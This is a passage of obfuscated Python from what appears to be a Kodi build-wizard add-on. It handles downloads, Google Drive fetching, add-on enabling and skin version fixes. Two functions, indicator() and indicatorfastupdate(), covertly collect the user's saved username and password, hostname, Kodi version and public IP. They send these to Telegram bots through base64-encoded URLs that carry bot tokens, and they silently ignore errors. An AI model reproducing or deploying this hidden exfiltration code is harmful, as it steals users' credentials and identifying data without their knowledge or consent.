  OO0O0000OOOOOO00O =OO0O0O00OOOO00000 #line:3447
  OOO0OO00OOO000OO0 =open (O00000000OO000O0O ,'wb')#line:3448
  try :#line:3450
    O0O000O0OOOOO0OOO =O00O00O0OO0OOOOO0 .info ().getheader ('Content-Length').strip ()#line:3451
    O0O0OOOO0OO00000O =True #line:3452
  except AttributeError :#line:3453
        O0O0OOOO0OO00000O =False #line:3454
  if O0O0OOOO0OO00000O :#line:3456
        O0O000O0OOOOO0OOO =int (O0O000O0OOOOO0OOO )#line:3457
  OO0OO00O00O0OOO0O =0 #line:3459
  O000OO0O0OO0O00O0 =time .time ()#line:3460
  while True :#line:3461
        OOOO0OOO00OO00O00 =O00O00O0OO0OOOOO0 .read (8192 )#line:3462
        if not OOOO0OOO00OO00O00 :#line:3463
            sys .stdout .write ('\n')#line:3464
            break #line:3465
        OO0OO00O00O0OOO0O +=len (OOOO0OOO00OO00O00 )#line:3467
        OOO0OO00OOO000OO0 .write (OOOO0OOO00OO00O00 )#line:3468
        if not O0O0OOOO0OO00000O :#line:3470
            O0O000O0OOOOO0OOO =OO0OO00O00O0OOO0O #line:3471
        if O0OOO0O00000O0O00 .iscanceled ():#line:3472
           O0OOO0O00000O0O00 .close ()#line:3473
           try :#line:3474
            os .remove (O00000000OO000O0O )#line:3475
           except :#line:3476
            pass #line:3477
           break #line:3478
        OO000OOOOO00O00O0 =float (OO0OO00O00O0OOO0O )/O0O000O0OOOOO0OOO #line:3479
        OO000OOOOO00O00O0 =round (OO000OOOOO00O00O0 *100 ,2 )#line:3480
        OOOOOO00000OOO0OO =OO0OO00O00O0OOO0O /(1024 *1024 )#line:3481
        OO00O0OOOO0O000O0 =O0O000O0OOOOO0OOO /(1024 *1024 )#line:3482
        O0O0O00000O0O00OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOOO00000OOO0OO ,'teal',OO00O0OOOO0O000O0 )#line:3483
        if (time .time ()-O000OO0O0OO0O00O0 )>0 :#line:3484
          OOOOO0OOOOO0000OO =OO0OO00O00O0OOO0O /(time .time ()-O000OO0O0OO0O00O0 )#line:3485
          OOOOO0OOOOO0000OO =OOOOO0OOOOO0000OO /1024 #line:3486
        else :#line:3487
         OOOOO0OOOOO0000OO =0 #line:3488
        OO00O0OO000O0O0OO ='KB'#line:3489
        if OOOOO0OOOOO0000OO >=1024 :#line:3490
           OOOOO0OOOOO0000OO =OOOOO0OOOOO0000OO /1024 #line:3491
           OO00O0OO000O0O0OO ='MB'#line:3492
        if OOOOO0OOOOO0000OO >0 and not OO000OOOOO00O00O0 ==100 :#line:3493
            O000000000O000OOO =(O0O000O0OOOOO0OOO -OO0OO00O00O0OOO0O )/OOOOO0OOOOO0000OO #line:3494
        else :#line:3495
            O000000000O000OOO =0 #line:3496
        OOOOO000O000O0O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOO0OOOOO0000OO ,OO00O0OO000O0O0OO )#line:3497
        O0OOO0O00000O0O00 .update (int (OO000OOOOO00O00O0 ),"Downloading "+name ,O0O0O00000O0O00OO ,OOOOO000O000O0O0O )#line:3499
  OO0OO0O00O00O0000 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3502
  OOO0OO00OOO000OO0 .close ()#line:3504
  extract (O00000000OO000O0O ,OO0OO0O00O00O0000 ,O0OOO0O00000O0O00 )#line:3506
  if os .path .exists (OO0OO0O00O00O0000 +'/scakemyer-script.quasar.burst'):#line:3507
    if os .path .exists (OO0OO0O00O00O0000 +'/script.quasar.burst'):#line:3508
     shutil .rmtree (OO0OO0O00O00O0000 +'/script.quasar.burst',ignore_errors =False )#line:3509
    os .rename (OO0OO0O00O00O0000 +'/scakemyer-script.quasar.burst',OO0OO0O00O00O0000 +'/script.quasar.burst')#line:3510
  if os .path .exists (OO0OO0O00O00O0000 +'/plugin.video.kmediatorrent-master'):#line:3512
    if os .path .exists (OO0OO0O00O00O0000 +'/plugin.video.kmediatorrent'):#line:3513
     shutil .rmtree (OO0OO0O00O00O0000 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3514
    os .rename (OO0OO0O00O00O0000 +'/plugin.video.kmediatorrent-master',OO0OO0O00O00O0000 +'/plugin.video.kmediatorrent')#line:3515
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3516
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3517
  try :#line:3518
    os .remove (O00000000OO000O0O )#line:3519
  except :#line:3520
    pass #line:3521
  O0OOO0O00000O0O00 .close ()#line:3522
def dis_or_enable_addon (O0OOOOO000000OOOO ,OOOOOO0000OO00OO0 ,enable ="true"):#line:3523
    import json #line:3524
    OOOO0O0000OOO000O ='"%s"'%O0OOOOO000000OOOO #line:3525
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OOOOO000000OOOO )and enable =="true":#line:3526
        logging .warning ('already Enabled')#line:3527
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0OOOOO000000OOOO )#line:3528
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OOOOO000000OOOO )and enable =="false":#line:3529
        return xbmc .log ("### Skipped %s, reason = not installed"%O0OOOOO000000OOOO )#line:3530
    else :#line:3531
        O0OOO00OO0O000O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOOO0O0000OOO000O ,enable )#line:3532
        O000000OO0O0O0OO0 =xbmc .executeJSONRPC (O0OOO00OO0O000O0O )#line:3533
        OO0O0OO0OOO00OO0O =json .loads (O000000OO0O0O0OO0 )#line:3534
        if enable =="true":#line:3535
            xbmc .log ("### Enabled %s, response = %s"%(O0OOOOO000000OOOO ,OO0O0OO0OOO00OO0O ))#line:3536
        else :#line:3537
            xbmc .log ("### Disabled %s, response = %s"%(O0OOOOO000000OOOO ,OO0O0OO0OOO00OO0O ))#line:3538
    if OOOOOO0000OO00OO0 =='auto':#line:3539
     return True #line:3540
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3541
def chunk_report (O0O0O0O00O00000OO ,OOOO0000OO0000OOO ,OO0O0O0O0O00OO000 ):#line:3542
   O00OO000OO0O00O0O =float (O0O0O0O00O00000OO )/OO0O0O0O0O00OO000 #line:3543
   O00OO000OO0O00O0O =round (O00OO000OO0O00O0O *100 ,2 )#line:3544
   if O0O0O0O00O00000OO >=OO0O0O0O0O00OO000 :#line:3546
      sys .stdout .write ('\n')#line:3547
def chunk_read (OOOOO0OOO0O0O0O00 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3549
   import time #line:3550
   OOOO0OO00OO000000 =int (filesize )*1000000 #line:3551
   O0OOO00OO00000OO0 =0 #line:3553
   O0OOO00OO0O00OOO0 =time .time ()#line:3554
   OOOOO0OO0O0O000O0 =0 #line:3555
   logging .warning ('Downloading')#line:3557
   with open (destination ,"wb")as OO000OO00O0000OOO :#line:3558
    while 1 :#line:3559
      O0O00000OO00OOO00 =time .time ()-O0OOO00OO0O00OOO0 #line:3560
      OOOOOO00OO000OOOO =int (OOOOO0OO0O0O000O0 *chunk_size )#line:3561
      O00OO00000OO0O0OO =OOOOO0OOO0O0O0O00 .read (chunk_size )#line:3562
      OO000OO00O0000OOO .write (O00OO00000OO0O0OO )#line:3563
      OO000OO00O0000OOO .flush ()#line:3564
      O0OOO00OO00000OO0 +=len (O00OO00000OO0O0OO )#line:3565
      O00O0O0O0O0O0O0O0 =float (O0OOO00OO00000OO0 )/OOOO0OO00OO000000 #line:3566
      O00O0O0O0O0O0O0O0 =round (O00O0O0O0O0O0O0O0 *100 ,2 )#line:3567
      if int (O0O00000OO00OOO00 )>0 :#line:3568
        OO000000OOO00O0OO =int (OOOOOO00OO000OOOO /(1024 *O0O00000OO00OOO00 ))#line:3569
      else :#line:3570
         OO000000OOO00O0OO =0 #line:3571
      if OO000000OOO00O0OO >1024 and not O00O0O0O0O0O0O0O0 ==100 :#line:3572
          O000O000O00OOO0OO =int (((OOOO0OO00OO000000 -OOOOOO00OO000OOOO )/1024 )/(OO000000OOO00O0OO ))#line:3573
      else :#line:3574
          O000O000O00OOO0OO =0 #line:3575
      if O000O000O00OOO0OO <0 :#line:3576
        O000O000O00OOO0OO =0 #line:3577
      dp .update (int (O00O0O0O0O0O0O0O0 ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O00O0O0O0O0O0O0O0 ,OOOOOO00OO000OOOO /(1024 *1024 ),OOOO0OO00OO000000 /(1000 *1000 ),OO000000OOO00O0OO ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O000O000O00OOO0OO ,60 ))#line:3578
      if dp .iscanceled ():#line:3579
         dp .close ()#line:3580
         break #line:3581
      if not O00OO00000OO0O0OO :#line:3582
         break #line:3583
      if report_hook :#line:3585
         report_hook (O0OOO00OO00000OO0 ,chunk_size ,OOOO0OO00OO000000 )#line:3586
      OOOOO0OO0O0O000O0 +=1 #line:3587
   logging .warning ('END Downloading')#line:3588
   return O0OOO00OO00000OO0 #line:3589
def googledrive_download (OO0OO00OO0000O0O0 ,O000O00OO00OOOOOO ,OO0OO0OOO00OO0O00 ,OO0OO00O00OO0OO0O ):#line:3591
    O000OO00O000000OO =[]#line:3595
    OOOOOOO00O00OOOOO =OO0OO00OO0000O0O0 .split ('=')#line:3596
    OO0OO00OO0000O0O0 =OOOOOOO00O00OOOOO [len (OOOOOOO00O00OOOOO )-1 ]#line:3597
    def O00O00OO00O0OOOO0 (O00000OOO00OOOOO0 ):#line:3599
        for OOO0OO0OOO0OOOOO0 in O00000OOO00OOOOO0 :#line:3601
            logging .warning ('cookie.name')#line:3602
            logging .warning (OOO0OO0OOO0OOOOO0 .name )#line:3603
            O0OO0OO0O0000OO00 =OOO0OO0OOO0OOOOO0 .value #line:3604
            if 'download_warning'in OOO0OO0OOO0OOOOO0 .name :#line:3605
                logging .warning (OOO0OO0OOO0OOOOO0 .value )#line:3606
                logging .warning ('cookie.value')#line:3607
                return OOO0OO0OOO0OOOOO0 .value #line:3608
            return O0OO0OO0O0000OO00 #line:3609
        return None #line:3611
    def OOOOOOOO0O0OOO000 (O0O000OO0O00OO0O0 ,O0O0O00O0OO0O0OO0 ):#line:3613
        O000OO0OOOOOO0O0O =32768 #line:3615
        OOOO0O000O0000OO0 =time .time ()#line:3616
        with open (O0O0O00O0OO0O0OO0 ,"wb")as OO0OO00OO0OO000OO :#line:3618
            OOOOOOO00OO000OOO =1 #line:3619
            OO00OOOOO000O0OO0 =32768 #line:3620
            try :#line:3621
                OO000OOO0O0OO00O0 =int (O0O000OO0O00OO0O0 .headers .get ('content-length'))#line:3622
                print ('file total size :',OO000OOO0O0OO00O0 )#line:3623
            except TypeError :#line:3624
                print ('using dummy length !!!')#line:3625
                OO000OOO0O0OO00O0 =int (OO0OO00O00OO0OO0O )*1000000 #line:3626
            for OO00OO0OO0O00000O in O0O000OO0O00OO0O0 .iter_content (O000OO0OOOOOO0O0O ):#line:3627
                if OO00OO0OO0O00000O :#line:3628
                    OO0OO00OO0OO000OO .write (OO00OO0OO0O00000O )#line:3629
                    OO0OO00OO0OO000OO .flush ()#line:3630
                    O00OOOO0OO0OO00O0 =time .time ()-OOOO0O000O0000OO0 #line:3631
                    OO000O000OOO00O0O =int (OOOOOOO00OO000OOO *OO00OOOOO000O0OO0 )#line:3632
                    if O00OOOO0OO0OO00O0 ==0 :#line:3633
                        O00OOOO0OO0OO00O0 =0.1 #line:3634
                    O0O0OO00O0O00OOOO =int (OO000O000OOO00O0O /(1024 *O00OOOO0OO0OO00O0 ))#line:3635
                    OO00OOOOO0OO00000 =int (OOOOOOO00OO000OOO *OO00OOOOO000O0OO0 *100 /OO000OOO0O0OO00O0 )#line:3636
                    if O0O0OO00O0O00OOOO >1024 and not OO00OOOOO0OO00000 ==100 :#line:3637
                      OO0OO00O0000O00O0 =int (((OO000OOO0O0OO00O0 -OO000O000OOO00O0O )/1024 )/(O0O0OO00O0O00OOOO ))#line:3638
                    else :#line:3639
                      OO0OO00O0000O00O0 =0 #line:3640
                    OO0OO0OOO00OO0O00 .update (int (OO00OOOOO0OO00000 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO00OOOOO0OO00000 ,OO000O000OOO00O0O /(1024 *1024 ),OO000OOO0O0OO00O0 /(1000 *1000 ),O0O0OO00O0O00OOOO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO0OO00O0000O00O0 ,60 ))#line:3642
                    OOOOOOO00OO000OOO +=1 #line:3643
                    if OO0OO0OOO00OO0O00 .iscanceled ():#line:3644
                     OO0OO0OOO00OO0O00 .close ()#line:3645
                     break #line:3646
    OO000O000OOO0O0O0 ="https://docs.google.com/uc?export=download"#line:3647
    import urllib2 #line:3652
    import cookielib #line:3653
    from cookielib import CookieJar #line:3655
    O0O0O0O00O0OO0OO0 =CookieJar ()#line:3657
    OO0OOO0OO0O00O0O0 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0O0O0O00O0OO0OO0 ))#line:3658
    O0OO0O0000OO0O00O ={'id':OO0OO00OO0000O0O0 }#line:3660
    O000O000O0O0O0OO0 =urllib .urlencode (O0OO0O0000OO0O00O )#line:3661
    logging .warning (OO000O000OOO0O0O0 +'&'+O000O000O0O0O0OO0 )#line:3662
    OOOOO00O0OO0OO00O =OO0OOO0OO0O00O0O0 .open (OO000O000OOO0O0O0 +'&'+O000O000O0O0O0OO0 )#line:3663
    O0OO0OO000O00OO0O =OOOOO00O0OO0OO00O .read ()#line:3664
    for O00OO0O000OOOOO00 in O0O0O0O00O0OO0OO0 :#line:3666
         logging .warning (O00OO0O000OOOOO00 )#line:3667
    O00000OOO00OOO0OO =O00O00OO00O0OOOO0 (O0O0O0O00O0OO0OO0 )#line:3668
    logging .warning (O00000OOO00OOO0OO )#line:3669
    if O00000OOO00OOO0OO :#line:3670
        OO0OOO0O00OOOO000 ={'id':OO0OO00OO0000O0O0 ,'confirm':O00000OOO00OOO0OO }#line:3671
        O00O0OO0000OOO000 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3672
        O000O000O0O0O0OO0 =urllib .urlencode (OO0OOO0O00OOOO000 )#line:3673
        OOOOO00O0OO0OO00O =OO0OOO0OO0O00O0O0 .open (OO000O000OOO0O0O0 +'&'+O000O000O0O0O0OO0 )#line:3674
        chunk_read (OOOOO00O0OO0OO00O ,report_hook =chunk_report ,dp =OO0OO0OOO00OO0O00 ,destination =O000O00OO00OOOOOO ,filesize =OO0OO00O00OO0OO0O )#line:3675
    return (O000OO00O000000OO )#line:3679
def kodi17Fix ():#line:3680
	O00O0O00OO0OO0OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3681
	OOOO000O0O0000OO0 =[]#line:3682
	for OO00000OO00OO0O00 in sorted (O00O0O00OO0OO0OO0 ,key =lambda O0O0O0OO00OOO0000 :O0O0O0OO00OOO0000 ):#line:3683
		OOO0O0OO0000O0O00 =os .path .join (OO00000OO00OO0O00 ,'addon.xml')#line:3684
		if os .path .exists (OOO0O0OO0000O0O00 ):#line:3685
			O0000O0000O0000OO =OO00000OO00OO0O00 .replace (ADDONS ,'')[1 :-1 ]#line:3686
			OO0OOO00O0000O0O0 =open (OOO0O0OO0000O0O00 )#line:3687
			OOOOOO0O000OOOOOO =OO0OOO00O0000O0O0 .read ()#line:3688
			O0OOO00000OO00OOO =parseDOM (OOOOOO0O000OOOOOO ,'addon',ret ='id')#line:3689
			OO0OOO00O0000O0O0 .close ()#line:3690
			try :#line:3691
				OO00OOOO000OOO0O0 =xbmcaddon .Addon (id =O0OOO00000OO00OOO [0 ])#line:3692
			except :#line:3693
				try :#line:3694
					log ("%s was disabled"%O0OOO00000OO00OOO [0 ],xbmc .LOGDEBUG )#line:3695
					OOOO000O0O0000OO0 .append (O0OOO00000OO00OOO [0 ])#line:3696
				except :#line:3697
					try :#line:3698
						log ("%s was disabled"%O0000O0000O0000OO ,xbmc .LOGDEBUG )#line:3699
						OOOO000O0O0000OO0 .append (O0000O0000O0000OO )#line:3700
					except :#line:3701
						if len (O0OOO00000OO00OOO )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0000O0000O0000OO ,xbmc .LOGERROR )#line:3702
						else :log ("Unabled to enable: %s"%OO00000OO00OO0O00 ,xbmc .LOGERROR )#line:3703
	if len (OOOO000O0O0000OO0 )>0 :#line:3704
		OOOOO0O0OO0OO0OOO =0 #line:3705
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3706
		for OO00OOOOOOOOOO000 in OOOO000O0O0000OO0 :#line:3707
			OOOOO0O0OO0OO0OOO +=1 #line:3708
			OO0OO00O000O0O00O =int (percentage (OOOOO0O0OO0OO0OOO ,len (OOOO000O0O0000OO0 )))#line:3709
			DP .update (OO0OO00O000O0O00O ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OOOOOOOOOO000 ))#line:3710
			addonDatabase (OO00OOOOOOOOOO000 ,1 )#line:3711
			if DP .iscanceled ():break #line:3712
		if DP .iscanceled ():#line:3713
			DP .close ()#line:3714
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3715
			sys .exit ()#line:3716
		DP .close ()#line:3717
	forceUpdate ()#line:3718
def indicator ():#line:3720
       try :#line:3721
          import json #line:3722
          wiz .log ('FRESH MESSAGE')#line:3723
          O00OOOO00OOOOO00O =(ADDON .getSetting ("user"))#line:3724
          OO0O0OOO0OOO00O00 =(ADDON .getSetting ("pass"))#line:3725
          OO0000OO0OO000OOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3726
          OO00OOO0OOOOO0O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3727
          O0OOOOOOO000OO0O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3728
          OOOO0OOO0O0000O0O =str (json .loads (O0OOOOOOO000OO0O0 )['ip'])#line:3729
          O000O000O0OOO0O00 =O00OOOO00OOOOO00O #line:3730
          O0O00O00OOOO00000 =OO0O0OOO0OOO00O00 #line:3731
          import socket #line:3732
          O0OOOOOOO000OO0O0 =urllib2 .urlopen (OO00OOO0OOOOO0O0O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O000O000O0OOO0O00 +' - '+O0O00O00OOOO00000 +' - '+OO0000OO0OO000OOO +' - '+OOOO0OOO0O0000O0O ).readlines ()#line:3733
       except :pass #line:3735
def indicatorfastupdate ():#line:3737
       try :#line:3738
          import json #line:3739
          wiz .log ('FRESH MESSAGE')#line:3740
          OO0OO0O0000000O00 =(ADDON .getSetting ("user"))#line:3741
          OOO0O0O000O0O00OO =(ADDON .getSetting ("pass"))#line:3742
          OOO0O0O0O00OOOOO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3743
          OO0O0O0OO00O00O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3745
          OO0OOOO0O000OOOOO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3746
          O0OOOOO0O000O00O0 =str (json .loads (OO0OOOO0O000OOOOO )['ip'])#line:3747
          O0O00O0O00OOO0000 =OO0OO0O0000000O00 #line:3748
          OOO00O0O00O0OO0OO =OOO0O0O000O0O00OO #line:3749
          import socket #line:3751
          OO0OOOO0O000OOOOO =urllib2 .urlopen (OO0O0O0OO00O00O0O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O00O0O00OOO0000 +' - '+OOO00O0O00O0OO0OO +' - '+OOO0O0O0O00OOOOO0 +' - '+O0OOOOO0O000O00O0 ).readlines ()#line:3752
       except :pass #line:3754
def skinfix18 ():#line:3756
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3757
		OOO000O0OO00OO0OO =wiz .workingURL (SKINID18DDONXML )#line:3758
		if OOO000O0OO00OO0OO ==True :#line:3759
			O0OO0000O0O0O0O00 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3760
			if len (O0OO0000O0O0O0O00 )>0 :#line:3761
				OOOOO0O0O00000O00 ='%s-%s.zip'%(SKINID18 ,O0OO0000O0O0O0O00 [0 ])#line:3762
				O0O0OOOO0000O00OO =wiz .workingURL (SKIN18ZIPURL +OOOOO0O0O00000O00 )#line:3763
				if O0O0OOOO0000O00OO ==True :#line:3764
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3765
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3766
					O000OO0O000O0OO00 =os .path .join (PACKAGES ,OOOOO0O0O00000O00 )#line:3767
					try :os .remove (O000OO0O000O0OO00 )#line:3768
					except :pass #line:3769
					downloader .download (SKIN18ZIPURL +OOOOO0O0O00000O00 ,O000OO0O000O0OO00 ,DP )#line:3770
					extract .all (O000OO0O000O0OO00 ,HOME ,DP )#line:3771
					try :#line:3772
						OO00OOO0OO000O000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3773
						O0OOO0OO0O0OO0000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3774
						os .rename (OO00OOO0OO000O000 ,O0OOO0OO0O0OO0000 )#line:3775
					except :#line:3776
						pass #line:3777
					try :#line:3778
						OO0OOO0000OOOO000 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO000O0OOOO0000O0 =OO0OOO0000OOOO000 .read ();OO0OOO0000OOOO000 .close ()#line:3779
						OOOOO0OOOO00000O0 =wiz .parseDOM (OO000O0OOOO0000O0 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3780
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOO0OOOO00000O0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3781
					except :#line:3782
						pass #line:3783
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3784
					DP .close ()#line:3785
					xbmc .sleep (500 )#line:3786
					wiz .forceUpdate (True )#line:3787
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3788
				else :#line:3789
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3790
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O0OOOO0000O00OO ,xbmc .LOGERROR )#line:3791
			else :#line:3792
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3793
		else :#line:3794
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3795
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3796
def skinfix17 ():#line:3797
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3798
		OO0000O00OO0O0OOO =wiz .workingURL (SKINID17DDONXML )#line:3799
		if OO0000O00OO0O0OOO ==True :#line:3800
			O0OO000O0O0OOOO00 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3801
			if len (O0OO000O0O0OOOO00 )>0 :#line:3802
				O0O00OOOO0O0OOO0O ='%s-%s.zip'%(SKINID17 ,O0OO000O0O0OOOO00 [0 ])#line:3803
				OOOOO0O0O0O0O000O =wiz .workingURL (SKIN17ZIPURL +O0O00OOOO0O0OOO0O )#line:3804
				if OOOOO0O0O0O0O000O ==True :#line:3805
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3806
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3807
					OOOOOO00O0000000O =os .path .join (PACKAGES ,O0O00OOOO0O0OOO0O )#line:3808
					try :os .remove (OOOOOO00O0000000O )#line:3809
					except :pass #line:3810
					downloader .download (SKIN17ZIPURL +O0O00OOOO0O0OOO0O ,OOOOOO00O0000000O ,DP )#line:3811
					extract .all (OOOOOO00O0000000O ,HOME ,DP )#line:3812
					try :#line:3813
						O0O00000O0O0OOO00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3814
						O00OOO0OOOOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3815
						os .rename (O0O00000O0O0OOO00 ,O00OOO0OOOOOOOO0O )#line:3816
					except :#line:3817
						pass #line:3818
					try :#line:3819
						OOOO0O0OOO0O0OO0O =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OO000OO000000O00O =OOOO0O0OOO0O0OO0O .read ();OOOO0O0OOO0O0OO0O .close ()#line:3820
						OO0O0OOOO0OOO0OOO =wiz .parseDOM (OO000OO000000O00O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3821
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OOOO0OOO0OOO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3822
					except :#line:3823
						pass #line:3824
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3825
					DP .close ()#line:3826
					xbmc .sleep (500 )#line:3827
					wiz .forceUpdate (True )#line:3828
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3829
				else :#line:3830
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3831
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOOOO0O0O0O0O000O ,xbmc .LOGERROR )#line:3832
			else :#line:3833
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3834
		else :#line:3835
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3836
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3837
def fix17update ():#line:3838
	if KODIV >=17 and KODIV <18 :#line:3839
		wiz .kodi17Fix ()#line:3840
		xbmc .sleep (4000 )#line:3841
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3842
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3843
		fixfont ()#line:3844
		OOOO00O000O0OOOOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3845
		try :#line:3847
			OO0OOO00OO0OO0000 =open (OOOO00O000O0OOOOO ,'r')#line:3848
			O000O0OO0OOO0OOO0 =OO0OOO00OO0OO0000 .read ()#line:3849
			OO0OOO00OO0OO0000 .close ()#line:3850
			O0OO0O0O00O0O0000 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3851
			OOO00O0O0OO0000O0 =re .compile (O0OO0O0O00O0O0000 ).findall (O000O0OO0OOO0OOO0 )[0 ]#line:3852
			OO0OOO00OO0OO0000 =open (OOOO00O000O0OOOOO ,'w')#line:3853
			OO0OOO00OO0OO0000 .write (O000O0OO0OOO0OOO0 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOO00O0O0OO0000O0 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3854
			OO0OOO00OO0OO0000 .close ()#line:3855
		except :#line:3856
				pass #line:3857
		wiz .kodi17Fix ()#line:3858
		OOOO00O000O0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3859
		try :#line:3860
			OO0OOO00OO0OO0000 =open (OOOO00O000O0OOOOO ,'r')#line:3861
			O000O0OO0OOO0OOO0 =OO0OOO00OO0OO0000 .read ()#line:3862
			OO0OOO00OO0OO0000 .close ()#line:3863
			O0OO0O0O00O0O0000 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3864
			OOO00O0O0OO0000O0 =re .compile (O0OO0O0O00O0O0000 ).findall (O000O0OO0OOO0OOO0 )[0 ]#line:3865
			OO0OOO00OO0OO0000 =open (OOOO00O000O0OOOOO ,'w')#line:3866
